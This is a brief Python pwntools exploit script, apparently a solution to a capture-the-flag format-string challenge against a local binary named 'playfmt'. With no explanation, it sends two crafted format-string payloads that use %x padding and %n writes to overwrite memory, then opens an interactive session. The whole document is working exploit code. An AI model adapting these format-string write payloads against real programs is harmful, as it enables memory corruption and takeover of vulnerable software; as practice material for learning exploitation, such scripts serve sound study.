from pwn import *


s = process("./playfmt")

elf = ELF("./playfmt")

gdb.attach(s)

s.recvuntil("==")

pay = "%4x"*6
pay += "%134520824x"
pay += "%n"

s.send(pay)

pay = "%4x"*8
pay += "%123x"
pay += "%n"

s.send(pay)


s.interactive()
